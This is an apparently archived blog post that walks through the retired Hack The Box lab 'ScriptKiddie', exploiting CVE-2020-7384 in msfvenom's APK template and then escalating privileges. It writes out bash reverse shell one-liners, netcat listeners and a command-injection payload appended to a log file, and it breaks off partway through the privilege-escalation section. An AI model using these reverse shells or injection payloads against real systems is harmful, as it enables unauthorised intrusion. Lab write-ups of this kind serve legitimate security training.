<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    <title>ScriptKiddie Walkthrough - HTB | CVE-2020-7384</title>
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="preload" href="../assets/css/app.css%3Fv=41e967d101.css" as="style" />
    <link rel="preload" href="../assets/js/manifest.js%3Fv=41e967d101" as="script" />
    <link rel="preload" href="../assets/js/vendor/content-api.min.js%3Fv=41e967d101" as="script" />
    <link rel="preload" href="../assets/js/vendor.js%3Fv=41e967d101" as="script" />
    <link rel="preload" href="../assets/js/app.js%3Fv=41e967d101" as="script" />
    <link rel="preconnect" href="https://polyfill.io">
    <link rel="dns-prefetch" href="https://polyfill.io">

      <link rel="preload" href="../assets/css/post.css%3Fv=41e967d101.css" as="style" />
  <link rel="preload" href="../assets/js/post.js%3Fv=41e967d101" as="script" />


    <style>
      /* These font-faces are here to make fonts work if the Ghost instance is installed in a subdirectory */

      /* source-sans-pro-regular */
      @font-face {
        font-family: 'Source Sans Pro';
        font-style: normal;
        font-weight: 400;
        font-display: swap;
        src: local('SourceSansPro-Regular'),
            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-regular.woff2%3Fv=41e967d101") format('woff2'),
            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-regular.woff%3Fv=41e967d101") format('woff');
      }

      /* source-sans-pro-600 */
      @font-face {
        font-family: 'Source Sans Pro';
        font-style: normal;
        font-weight: 600;
        font-display: swap;
        src: local('SourceSansPro-SemiBold'),
            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-600.woff2%3Fv=41e967d101") format('woff2'),
            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-600.woff%3Fv=41e967d101") format('woff');
      }

      /* source-sans-pro-700 */
      @font-face {
        font-family: 'Source Sans Pro';
        font-style: normal;
        font-weight: 700;
        font-display: swap;
        src: local('SourceSansPro-Bold'),
            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-700.woff2%3Fv=41e967d101") format('woff2'),
            url("../assets/fonts/source-sans-pro/latin/source-sans-pro-700.woff%3Fv=41e967d101") format('woff');
      }

      /* iconmoon */
      @font-face {
        font-family: 'icomoon';
        font-weight: normal;
        font-style: normal;
        font-display: swap;
        src: url("../assets/fonts/icomoon/icomoon.eot%3F101fc3%3Fv=41e967d101");
        src: url("../assets/fonts/icomoon/icomoon.eot%3F101fc3%3Fv=41e967d101") format('embedded-opentype'),
        url("../assets/fonts/icomoon/icomoon.ttf%3F101fc3%3Fv=41e967d101") format('truetype'),
        url("../assets/fonts/icomoon/icomoon.woff%3F101fc3%3Fv=41e967d101") format('woff'),
        url("../assets/fonts/icomoon/icomoon.svg%3F101fc3%3Fv=41e967d101") format('svg');
      }
    </style>

    <link rel="stylesheet" type="text/css" href="../assets/css/app.css%3Fv=41e967d101.css" media="screen" />

      <link rel="stylesheet" type="text/css" href="../assets/css/post.css%3Fv=41e967d101.css" media="screen" />


    

    <meta name="description" content="After all ScriptKiddie has been retired, So I&#x27;m here for the ScriptKiddies | CVE-2020-7384 Exploit POC explain, without Metasploit">
    <link rel="icon" href="../content/images/2021/06/favicon.ico" type="image/x-icon">
    <link rel="canonical" href="index.html">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="amphtml" href="amp/index.html">
    
    <meta property="og:site_name" content="h4rithd.com">
    <meta property="og:type" content="article">
    <meta property="og:title" content="ScriptKiddie Walkthrough - HTB | CVE-2020-7384">
    <meta property="og:description" content="After all ScriptKiddie has been retired, So I&#x27;m here for the ScriptKiddies | CVE-2020-7384 Exploit POC explain, without Metasploit">
    <meta property="og:url" content="https://h4rithd.com/blog/scriptkiddie-walkthrough/">
    <meta property="og:image" content="https://h4rithd.com/blog/content/images/2021/06/ScriptKiddieBG.jpg">
    <meta property="article:published_time" content="2021-06-05T16:28:00.000Z">
    <meta property="article:modified_time" content="2023-11-15T14:05:58.000Z">
    <meta property="article:tag" content="ScriptKiddie Walkthrough">
    <meta property="article:tag" content="CVE-2020-7384">
    <meta property="article:tag" content="h4rithd">
    <meta property="article:tag" content="Harith Dilshan">
    <meta property="article:tag" content="Retired Machines HTB">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="ScriptKiddie Walkthrough - HTB | CVE-2020-7384">
    <meta name="twitter:description" content="After all ScriptKiddie has been retired, So I&#x27;m here for the ScriptKiddies | CVE-2020-7384 Exploit POC explain, without Metasploit">
    <meta name="twitter:url" content="https://h4rithd.com/blog/scriptkiddie-walkthrough/">
    <meta name="twitter:image" content="https://h4rithd.com/blog/content/images/2021/06/ScriptKiddieBG.jpg">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="Harith Dilshan">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="ScriptKiddie Walkthrough, CVE-2020-7384, h4rithd, Harith Dilshan, Retired Machines HTB">
    <meta name="twitter:site" content="@h4rithd">
    <meta name="twitter:creator" content="@h4rithd">
    <meta property="og:image:width" content="1920">
    <meta property="og:image:height" content="1035">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "h4rithd.com",
        "url": "https://h4rithd.com/blog/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://h4rithd.com/blog/content/images/2021/06/Logo.png",
            "width": 60,
            "height": 60
        }
    },
    "author": {
        "@type": "Person",
        "name": "Harith Dilshan",
        "image": {
            "@type": "ImageObject",
            "url": "https://h4rithd.com/blog/content/images/2023/11/5-1.jpeg",
            "width": 2000,
            "height": 2000
        },
        "url": "https://h4rithd.com/blog/author/h4rithd/",
        "sameAs": [
            "https://h4rithd.com/",
            "https://twitter.com/h4rithd"
        ]
    },
    "headline": "ScriptKiddie Walkthrough - HTB | CVE-2020-7384",
    "url": "https://h4rithd.com/blog/scriptkiddie-walkthrough/",
    "datePublished": "2021-06-05T16:28:00.000Z",
    "dateModified": "2023-11-15T14:05:58.000Z",
    "image": {
        "@type": "ImageObject",
        "url": "https://h4rithd.com/blog/content/images/2021/06/ScriptKiddieBG.jpg",
        "width": 1920,
        "height": 1035
    },
    "keywords": "ScriptKiddie Walkthrough, CVE-2020-7384, h4rithd, Harith Dilshan, Retired Machines HTB",
    "description": "After all ScriptKiddie has been retired, So I&#x27;m here for the ScriptKiddies üòâüòâ\n\nAs it is implied in the name of the machine, it&#x27;s kinda like CTF. Also in the machine&#x27;s matrix on the statistics page will give the characteristics.\n\nThe overall experience is so good. Here I explain how to use CVE-2020-7384 exploit without tackling with Metasploit Framework. PrivEsc is so simple if you can understand the shell codes. Hope you will like it. üòäüòä\n\nEnough talks, ü•± Let‚Äôs Get It Started üê±‚Äçüíª\n\nDisclaim",
    "mainEntityOfPage": "https://h4rithd.com/blog/scriptkiddie-walkthrough/"
}
    </script>

    <meta name="generator" content="Ghost 5.72">
    <link rel="alternate" type="application/rss+xml" title="h4rithd.com" href="../rss/index.html">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="dfa19ad36106599a5650f2ae60" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://h4rithd.com/blog/" crossorigin="anonymous"></script>
    
    <link href="https://h4rithd.com/blog/webmentions/receive/" rel="webmention">
    <script defer src="../public/cards.min.js%3Fv=41e967d101"></script>
    <link rel="stylesheet" type="text/css" href="../public/cards.min.css%3Fv=41e967d101.css">
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.16.0/themes/prism-tomorrow.min.css"></link>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/plugins/toolbar/prism-toolbar.min.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/plugins/line-numbers/prism-line-numbers.min.css" />
<style>
    pre[class*=language-] {
        margin: 1.75em 0;
        font-size: 1.0rem;
        background: #111;
    }
</style>
<style>
.m-footer-copyright span:nth-child(2), .m-footer-copyright span:nth-child(3) {
    display: none;
}
</style>

<style>
blockquote {
    border-left: 4px solid #3897D3;
    font-weight: unset;
    line-height: unset;
    font-size: 17px;
    padding-left: 1rem;
    margin: 1rem 0;
}

.post-author-image {
    width: 100%;
    height: 100%;
}
</style<style>:root {--ghost-accent-color: #0065a3;}</style>

    <script>
      
    </script>
  </head>
  <body class="post-template tag-scriptkiddie-walkthrough tag-cve-2020-7384 tag-h4rithd tag-harith-dilshan tag-retired-machines-htb">
    



  
<header class="m-header with-picture js-header">
  <div class="m-mobile-topbar" data-aos="fade-down">
    <button class="m-icon-button in-mobile-topbar js-open-menu" aria-label="Open menu">
      <span class="icon-menu" aria-hidden="true"></span>
    </button>
      <a href="../index.html" class="m-logo in-mobile-topbar">
        <img src="../content/images/2021/06/Logo.png" alt="h4rithd.com">
      </a>
    <button class="m-icon-button in-mobile-topbar js-open-search" aria-label="Open search">
      <span class="icon-search" aria-hidden="true"></span>
    </button>
  </div>

  <div class="m-menu js-menu">
    <button class="m-icon-button outlined as-close-menu js-close-menu" aria-label="Close menu">
      <span class="icon-close"></span>
    </button>
    <div class="m-menu__main" data-aos="fade-down">
      <div class="l-wrapper">
        <div class="m-nav js-main-nav">
          <nav class="m-nav__left js-main-nav-left" role="navigation" aria-label="Main menu">
            <ul>
                <li class="only-desktop">
                  <a href="../index.html" class="m-logo">
                    <img src="../content/images/2021/06/Logo.png" alt="h4rithd.com">
                  </a>
                </li>
                
    <li class="nav-me">
      <a href="https://h4rithd.com/">Me</a>
    </li>
    <li class="nav-blog">
      <a href="https://h4rithd.com/blog/">Blog</a>
    </li>
    <li class="nav-starting-point">
      <a href="https://h4rithd.com/blog/tag/starting-point-htb/">Starting Point</a>
    </li>
    <li class="nav-retired-machines">
      <a href="https://h4rithd.com/blog/tag/retired-machines-htb/">Retired Machines</a>
    </li>

              <li class="submenu-option js-submenu-option">
                <button class="m-icon-button in-menu-main more js-toggle-submenu" aria-label="Open submenu">
                  <span class="icon-more" aria-hidden="true"></span>
                </button>
                <div class="m-submenu js-submenu">
                  <div class="l-wrapper in-submenu">
                    <section class="m-recent-articles">
                      <h3 class="m-submenu-title in-recent-articles">Recent articles</h3>
                          <div class="glide js-recent-slider">
                            <div class="glide__track" data-glide-el="track">
                              <div class="glide__slides">
                                <div class="glide__slide">
                                  <a href="../broker-walkthrough/index.html" class="m-recent-article">
                                    <div class="m-recent-article__picture ">
                                        <img src="../content/images/size/w300/2023/11/PostImage.jpg" loading="lazy" alt="">
                                    </div>
                                    <h3 class="m-recent-article__title js-recent-article-title" title="Broker Walkthrough">
                                      Broker Walkthrough
                                    </h3>
                                    <span class="m-recent-article__date">2 days ago</span>
                                  </a>
                                </div>
                                <div class="glide__slide">
                                  <a href="../knife-walkthrough/index.html" class="m-recent-article">
                                    <div class="m-recent-article__picture ">
                                        <img src="../content/images/size/w300/2021/08/PostBanner.jpg" loading="lazy" alt="">
                                    </div>
                                    <h3 class="m-recent-article__title js-recent-article-title" title="Knife Walkthrough">
                                      Knife Walkthrough
                                    </h3>
                                    <span class="m-recent-article__date">2 years ago</span>
                                  </a>
                                </div>
                                <div class="glide__slide">
                                  <a href="../introduction-to-binary-exploitation-reg-htb/index.html" class="m-recent-article">
                                    <div class="m-recent-article__picture ">
                                        <img src="../content/images/size/w300/2021/06/Binary101.jpg" loading="lazy" alt="">
                                    </div>
                                    <h3 class="m-recent-article__title js-recent-article-title" title="Introduction to Binary Exploitation | Reg HTB">
                                      Introduction to Binary Exploitation | Reg HTB
                                    </h3>
                                    <span class="m-recent-article__date">2 years ago</span>
                                  </a>
                                </div>
                                <div class="glide__slide">
                                  <a href="index.html" class="m-recent-article">
                                    <div class="m-recent-article__picture ">
                                        <img src="../content/images/size/w300/2021/06/ScriptKiddieBG.jpg" loading="lazy" alt="">
                                    </div>
                                    <h3 class="m-recent-article__title js-recent-article-title" title="ScriptKiddie Walkthrough">
                                      ScriptKiddie Walkthrough
                                    </h3>
                                    <span class="m-recent-article__date">2 years ago</span>
                                  </a>
                                </div>
                              </div>
                            </div>
                          </div>
                    </section>
                    <section class="m-tags">
                      <h3 class="m-submenu-title">Tags</h3>
                        <ul>
                            <li>
                              <a href="../tag/10-10-11-243/index.html">10.10.11.243</a>
                            </li>
                            <li>
                              <a href="../tag/apache-activemq/index.html">Apache ActiveMQ</a>
                            </li>
                            <li>
                              <a href="../tag/archetype-walkthrough/index.html">Archetype Walkthrough</a>
                            </li>
                            <li>
                              <a href="../tag/base-walkthrough/index.html">Base Walkthrough</a>
                            </li>
                            <li>
                              <a href="../tag/binary-exploitation/index.html">Binary Exploitation</a>
                            </li>
                            <li>
                              <a href="../tag/broker-walkthrough/index.html">Broker Walkthrough</a>
                            </li>
                            <li>
                              <a href="../tag/cve-2020-7384/index.html">CVE-2020-7384</a>
                            </li>
                            <li>
                              <a href="../tag/cve-2023-46604/index.html">CVE-2023-46604</a>
                            </li>
                            <li>
                              <a href="../tag/guard-walkthrough/index.html">Guard Walkthrough</a>
                            </li>
                            <li>
                              <a href="../tag/htb/index.html">HTB</a>
                            </li>
                        </ul>
                    </section>
                  </div>
                </div>
              </li>
            </ul>
          </nav>
          <div class="m-nav__right">
            <button class="m-icon-button in-menu-main js-open-search" aria-label="Open search">
              <span class="icon-search" aria-hidden="true"></span>
            </button>
            <div class="m-toggle-darkmode js-tooltip" data-tippy-content="Toggle dark mode" tabindex="0">
              <label for="toggle-darkmode" class="sr-only">
                Toggle dark mode
              </label>
              <input id="toggle-darkmode" type="checkbox" class="js-toggle-darkmode">
              <div>
                <span class="icon-moon moon" aria-hidden="true"></span>
                <span class="icon-sunny sun" aria-hidden="true"></span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

</header>

<main class="main-wrap">
    
  <section class="m-hero with-picture" data-aos="fade">
    <div class="m-hero__picture in-post">
      <img
        srcset="../content/images/size/w300/2021/06/ScriptKiddieBG.jpgiddieBG.jpg 300w../content/images/size/w600/2021/06/ScriptKiddieBG.jpgKiddieBG.jpg 600../content/images/size/w1000/2021/06/ScriptKiddieBG.jpgtKiddieBG.jpg 100../content/images/size/w2000/2021/06/ScriptKiddieBG.jpgptKiddieBG.jpg 2000w
        "
        sizes="(max-width: 600px) 600px, (max-width: 1000px) 1000px, 2000px"
        src="../content/images/size/w1000/2021/06/ScriptKiddieBG.jpg"
        alt=""
      />
    </div>
    </section>
  
  <article>
    <div class="l-content in-post">
        <div class="l-wrapper in-post  js-aos-wrapper" data-aos="fade-up"
          data-aos-delay="300">
          <div
            class="l-post-content js-progress-content">
            <header class="m-heading">
              <h1 class="m-heading__title in-post">ScriptKiddie Walkthrough</h1>
              <div class="m-heading__meta">
                  <a href="../tag/scriptkiddie-walkthrough/index.html" class="m-heading__meta__tag">ScriptKiddie Walkthrough</a>
                  <span class="m-heading__meta__divider" aria-hidden="true">&bull;</span>
                <span class="m-heading__meta__time">Jun 5, 2021</span>
              </div>
            </header>
            <div class="pos-relative js-post-content">
              <div class="m-share">
                <div class="m-share__content js-sticky">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https://h4rithd.com/blog/scriptkiddie-walkthrough/"
                    class="m-icon-button filled in-share" target="_blank" rel="noopener" aria-label="Facebook">
                    <span class="icon-facebook" aria-hidden="true"></span>
                  </a>
                  <a href="https://twitter.com/intent/tweet?text=ScriptKiddie%20Walkthrough&url=https://h4rithd.com/blog/scriptkiddie-walkthrough/"
                    class="m-icon-button filled in-share" target="_blank" rel="noopener" aria-label="Twitter">
                    <span class="icon-twitter" aria-hidden="true"></span>
                  </a>
                  <button class="m-icon-button filled in-share progress js-scrolltop" aria-label="Scroll to top">
                    <span class="icon-arrow-top" aria-hidden="true"></span>
                    <svg aria-hidden="true">
                      <circle class="progress-ring__circle js-progress" fill="transparent" r="0" />
                    </svg>
                  </button>
                </div>
              </div>
              <p>After all ScriptKiddie has been retired, So I'm here for the ScriptKiddies üòâüòâ</p><hr><p>As it is implied in the name of the machine, it's kinda like CTF. Also in the machine's matrix on the statistics page will give the characteristics.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-238.png" class="kg-image" alt loading="lazy" width="674" height="491" srcset="../content/images/size/w600/2021/06/image-238.png 600w, ../content/images/2021/06/image-238.png 674w"></figure><p>The overall experience is so good. Here I explain how to use <strong>CVE-2020-7384</strong> exploit without tackling with Metasploit Framework. <strong>PrivEsc </strong>is so simple if you can understand the shell codes. Hope you will like it. üòäüòä</p><p>Enough talks, ü•± Let‚Äôs Get It Started üê±‚Äçüíª</p><p><strong>Disclaimers: </strong>No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedure to grab the flags! üê±‚Äçüë§</p>
<!--kg-card-begin: html-->
<script src="https://apps.elfsight.com/p/platform.js" defer></script>
<div class="elfsight-app-a4de7430-6c0c-44b8-aada-9b9ac759e396"></div>
<!--kg-card-end: html-->
<hr><h2 id="01-enumeration">01 Enumeration</h2><p>First of all I will check the status of my VPN connection and whether machine is alive or not. To do that we can simply ping to the IP address like this üëáüëá</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-239.png" class="kg-image" alt loading="lazy" width="1492" height="554" srcset="../content/images/size/w600/2021/06/image-239.png 600w, ../content/images/size/w1000/2021/06/image-239.png 1000w, ../content/images/2021/06/image-239.png 1492w" sizes="(min-width: 720px) 720px"></figure><p>As you can see here, the <strong>TTL value is 63</strong>. That implies this machine is Linux.</p><p>As usual, let's begin with Nmap. First of all I need to know what ports are open, so run fast scan for all TCP ports.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.226</code></pre><p>Here is the output üëáüëá</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-240.png" class="kg-image" alt loading="lazy" width="1868" height="1106" srcset="../content/images/size/w600/2021/06/image-240.png 600w, ../content/images/size/w1000/2021/06/image-240.png 1000w, ../content/images/size/w1600/2021/06/image-240.png 1600w, ../content/images/2021/06/image-240.png 1868w" sizes="(min-width: 720px) 720px"></figure><p>So, there are only two open ports. ü§îü§î</p><h3 id="011-run-nmap-scripting-engine">01.1 Run Nmap Scripting Engine</h3><p>To get the best result, we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all of the open ports and therefore, we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p 22,5000 10.10.10.226</code></pre><p>Here is the output. üëáüëá</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-241.png" class="kg-image" alt loading="lazy" width="1992" height="922" srcset="../content/images/size/w600/2021/06/image-241.png 600w, ../content/images/size/w1000/2021/06/image-241.png 1000w, ../content/images/size/w1600/2021/06/image-241.png 1600w, ../content/images/2021/06/image-241.png 1992w" sizes="(min-width: 720px) 720px"></figure><p>By looking at the SSH service info we can definitely say that the Operating System is <strong>Ubuntu </strong>and  <a href="https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4?ref=172.16.211.133" rel="noopener noreferrer">launchpad</a> information gives us the flavor is <strong>Focal Fossa</strong>. Kind of cute ah!üòâüòâ</p><p>You can search known exploits for SSH but trust me nothing can be found!.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-242.png" class="kg-image" alt loading="lazy" width="1192" height="370" srcset="../content/images/size/w600/2021/06/image-242.png 600w, ../content/images/size/w1000/2021/06/image-242.png 1000w, ../content/images/2021/06/image-242.png 1192w" sizes="(min-width: 720px) 720px"></figure><p>Now we have only one port left and it is <strong>5000/tcp</strong>. As in the Nmap results, that port is running a web server called <strong>Werkzeug.</strong></p><blockquote><strong>Werkzeug</strong> is a comprehensive WSGI web application library. It began as a simple collection of various utilities for WSGI applications and has become one of the most advanced WSGI utility libraries. <a href="https://werkzeug.palletsprojects.com/en/2.0.x/?ref=172.16.211.133" rel="noopener noreferrer">source</a></blockquote><p>Since it is a webserver, let's browse using Firefox. You are free to use your own fav browser. But remember! sometimes we need to intercept the web traffic. I have already configured Firefox browser with burp certificate. That's why I'm using Firefox ü¶äü¶ä</p><p>Open web browser and navigate to<strong> http://10.10.10.226:5000/</strong></p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-243.png" class="kg-image" alt loading="lazy" width="1586" height="775" srcset="../content/images/size/w600/2021/06/image-243.png 600w, ../content/images/size/w1000/2021/06/image-243.png 1000w, ../content/images/2021/06/image-243.png 1586w" sizes="(min-width: 720px) 720px"></figure><p>By looking at the interface, we realize that certainly we have plenty of enumerations here. Isn't that so mate?? ü§¶‚Äç‚ôÇÔ∏èü§¶‚Äç‚ôÇÔ∏è</p><p>After doing a number of enumerations, (LFI,SSRF,RCE etc..) I found the Foothold. ü§†ü§†</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-244.png" class="kg-image" alt loading="lazy" width="640" height="1088" srcset="../content/images/size/w600/2021/06/image-244.png 600w, ../content/images/2021/06/image-244.png 640w"></figure><hr><h2 id="02-foothold-with-out-using-msf">02. Foothold | With out using MSF</h2><p>Now we have the gun. Let's load it and shoot üî´</p><p>I neglected to mention what is that vulnerability. Therefore, let me introduce the <strong>CVE-2020-7384</strong> üéáüéá Actually that vulnerability works on the Metasploit's msfvenom payload generator. Here is a small description of the vulnerability from <a href="https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/?ref=172.16.211.133" rel="noopener noreferrer">Rapid7</a></p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-245.png" class="kg-image" alt loading="lazy" width="1090" height="229" srcset="../content/images/size/w600/2021/06/image-245.png 600w, ../content/images/size/w1000/2021/06/image-245.png 1000w, ../content/images/2021/06/image-245.png 1090w" sizes="(min-width: 720px) 720px"></figure><p>But we are not playing here with metasploit. Let's do it manually ok?? ü¶Ωüòâ</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-246.png" class="kg-image" alt loading="lazy" width="480" height="360"></figure><p>Here is the POC code for the vularability. üëáüëá</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md?ref=172.16.211.133"><div class="kg-bookmark-content"><div class="kg-bookmark-title">justinsteven/advisories</div><div class="kg-bookmark-description">Contribute to justinsteven/advisories development by creating an account on GitHub.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://github.githubassets.com/favicons/favicon.svg" alt><span class="kg-bookmark-author">GitHub</span><span class="kg-bookmark-publisher">justinsteven</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://opengraph.githubassets.com/8c6db3fce370680f2d6801ff0e9c896e8f6576d1cd8f78dc042d7edd8404b3af/justinsteven/advisories" alt></div></a></figure><p>First go the POC section and copy that to a file in our host machine.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-248.png" class="kg-image" alt loading="lazy" width="1381" height="622" srcset="../content/images/size/w600/2021/06/image-248.png 600w, ../content/images/size/w1000/2021/06/image-248.png 1000w, ../content/images/2021/06/image-248.png 1381w" sizes="(min-width: 720px) 720px"></figure><p>After that, read the POC line by line. It is written in <strong>python3</strong> and you are not a kiddie right?  Read the code line by line, understand it and come back.</p><p>The code contains the payload section itself. We only have to replace that payload. See how cheap it is?</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-249.png" class="kg-image" alt loading="lazy" width="1654" height="554" srcset="../content/images/size/w600/2021/06/image-249.png 600w, ../content/images/size/w1000/2021/06/image-249.png 1000w, ../content/images/size/w1600/2021/06/image-249.png 1600w, ../content/images/2021/06/image-249.png 1654w" sizes="(min-width: 720px) 720px"></figure><p>Now it's time to load the gun. Simply says, time to create the payload. Since we need a reverse shell I will go and create the bash reverse shell to replace the payload section. Follow the code line below üëáüëá</p><pre><code class="language-bash">/bin/bash -c \"/bin/bash -i &gt;&amp; /dev/tcp/&lt;YourIP&gt;/4545 0&gt;&amp;1\"</code></pre><p>Final exploit will look like this.üëáüëá Please note to replace <strong>YourIP </strong>as yours.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-250.png" class="kg-image" alt loading="lazy" width="1684" height="554" srcset="../content/images/size/w600/2021/06/image-250.png 600w, ../content/images/size/w1000/2021/06/image-250.png 1000w, ../content/images/size/w1600/2021/06/image-250.png 1600w, ../content/images/2021/06/image-250.png 1684w" sizes="(min-width: 720px) 720px"></figure><blockquote>üì¢üì¢ <em>Let me introduce my Reverse shell generator for HTB. Click <a href="https://github.com/h4rithd/RevSh3ll-HTB?ref=172.16.211.133" rel="noopener noreferrer"><em>here</em></a> to check how awful it is.</em></blockquote><p>Is everything fine?? Let's compile the code. I will use python3 because the code was written in python3. üòúüòú</p><pre><code class="language-bash">python3 exploit.py</code></pre><p>Here we have our loaded weapon. üî´üî´</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-251.png" class="kg-image" alt loading="lazy" width="2000" height="747" srcset="../content/images/size/w600/2021/06/image-251.png 600w, ../content/images/size/w1000/2021/06/image-251.png 1000w, ../content/images/size/w1600/2021/06/image-251.png 1600w, ../content/images/size/w2400/2021/06/image-251.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>After you run the exploit, usually the payload APK file will be stored in <code>/tmp</code> directory.  I copied it to the Download directory because, it will be easy for me to browse and select the file. I don't know what is your fav directory so go and copy that f*#$ing APK file to whatever directory you want. üò†üò†</p><p>Also, don't forget to power up netcat listener.üòÅüòÅ</p><pre><code class="language-bash">nc -lvnp 4545</code></pre><p>Now go to the web browser again and go to the payload section too.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-252.png" class="kg-image" alt loading="lazy" width="597" height="322"></figure><p>After doing all the above things, click generate button. Are you listening trough netcat my mate? Look what we got.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-253.png" class="kg-image" alt loading="lazy" width="1730" height="662" srcset="../content/images/size/w600/2021/06/image-253.png 600w, ../content/images/size/w1000/2021/06/image-253.png 1000w, ../content/images/size/w1600/2021/06/image-253.png 1600w, ../content/images/2021/06/image-253.png 1730w" sizes="(min-width: 720px) 720px"></figure><hr><h2 id="03-privilege-escalation"><strong>03. Privilege Escalation</strong></h2><p>First of all I search around <code>.ssh</code> directory. And it has only <code>authorized_keys</code> left which means you can create SSH key pair using <code>ssh-keygen</code> , then upload the public key to the <code>authorized_keys</code> file. And then you can use SSH to login as user <code>kid</code> by using your private key. But I'm not going to do it here. üòÅüòÅüòÅ</p><p>After doing some enumerations I found a fancy script called <code>scanlosers.sh</code> in <code>/home/pwn</code> directory and it is also owned by the user <code>pwn</code>. By looking at the permission on the file, definitely we can't write anything to that file too.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-254.png" class="kg-image" alt loading="lazy" width="1684" height="772" srcset="../content/images/size/w600/2021/06/image-254.png 600w, ../content/images/size/w1000/2021/06/image-254.png 1000w, ../content/images/size/w1600/2021/06/image-254.png 1600w, ../content/images/2021/06/image-254.png 1684w" sizes="(min-width: 720px) 720px"></figure><p>Let's open that file.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-255.png" class="kg-image" alt loading="lazy" width="1644" height="662" srcset="../content/images/size/w600/2021/06/image-255.png 600w, ../content/images/size/w1000/2021/06/image-255.png 1000w, ../content/images/size/w1600/2021/06/image-255.png 1600w, ../content/images/2021/06/image-255.png 1644w" sizes="(min-width: 720px) 720px"></figure><p>By analyzing the script and debugging the code line by line, (Actually here I copied that <code>scanlosers.sh</code> file to my host machine and also created the <code>hackers</code> file in my local system. Then I tried to take the advantage using <code>hackers</code> file. Because in this scenario we can write things only to <code>hackers</code> file) I found the exact way to get reverse shell as the user <strong><code>pwn</code></strong> . Now go and check the file permission on <code>hackers</code> file. You'll see that we can write anything to that file.</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-256.png" class="kg-image" alt loading="lazy" width="1384" height="332" srcset="../content/images/size/w600/2021/06/image-256.png 600w, ../content/images/size/w1000/2021/06/image-256.png 1000w, ../content/images/2021/06/image-256.png 1384w" sizes="(min-width: 720px) 720px"></figure><p>So here is my payload.üëáüèøüëáüèø</p><pre><code class="language-bash">echo "h4rithd  ;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;YourIP&gt;/7878 0&gt;&amp;1' #" &gt;&gt; /home/kid/logs/hackers</code></pre><p>Please note that you must give a double space between <code>h4rithd</code> and <code>;</code> mark. Again change <strong>YourIP </strong>as yours. Before going to execute that command, open a new terminal and start the netcat listener again on port <code>7878</code>. üòéüòé</p><pre><code class="language-bash"> nc -lvnp 7878</code></pre><p>After all, execute above payload and wait for the reverse shell. ü•±ü•±ü•±</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-257.png" class="kg-image" alt loading="lazy" width="2000" height="230" srcset="../content/images/size/w600/2021/06/image-257.png 600w, ../content/images/size/w1000/2021/06/image-257.png 1000w, ../content/images/size/w1600/2021/06/image-257.png 1600w, ../content/images/size/w2400/2021/06/image-257.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>But mate, if you are in a busy environment, I mean, if so many users are using the box at the same time that you are using this, the payload won't work quickly. So... you'd better go, sip some coffee‚òï and try again afterwards</p><p>In a short time, we got reverse shell as user <strong><code>pwn</code> </strong>. üòéüòéüòé And if you are familiar in Privilege Escalation you already know what the next command is. Usually it is <code>sudo -l</code></p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-258.png" class="kg-image" alt loading="lazy" width="1940" height="846" srcset="../content/images/size/w600/2021/06/image-258.png 600w, 